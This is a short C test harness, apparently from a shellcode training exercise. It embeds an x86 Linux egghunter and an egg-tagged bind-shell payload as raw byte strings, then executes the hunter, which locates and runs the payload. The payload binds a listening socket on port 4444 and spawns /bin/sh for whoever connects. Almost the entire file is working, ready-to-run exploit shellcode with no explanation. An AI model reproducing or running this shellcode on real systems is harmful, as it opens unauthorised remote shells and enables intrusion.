#include <stdio.h>
#include <string.h>

/*
	Hunter Length:  35
	Payload Length:  117
*/

unsigned char hunter[] = "\xfc\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x6a\x21\x58\x8d\x5a\x04\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";

//bind shell with execve for more details check assignment 1
unsigned char payload[] =\
"\x90\x50\x90\x50" //egg
"\x90\x50\x90\x50" //egg
"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xeb\x50\x5f\x6a\x66\x58\x43\x31\xd2\x52\x66\xff\x37\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\x43\x43\x6a\x01\x56\x89\xe1\xcd\x80\xb0\x66\x43\x52\x52\x56\x89\xe1\xcd\x80\x93\x6a\x03\x59\x49\xb0\x3f\xcd\x80\x75\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\xe8\xab\xff\xff\xff\x11\x5c";

main()
{
	printf("Hunter Length:  %d\n", strlen(hunter));
	printf("Payload Length:  %d\n", strlen(payload));
	int (*ret)() = (int(*)())hunter;
	ret();
	return 0;
}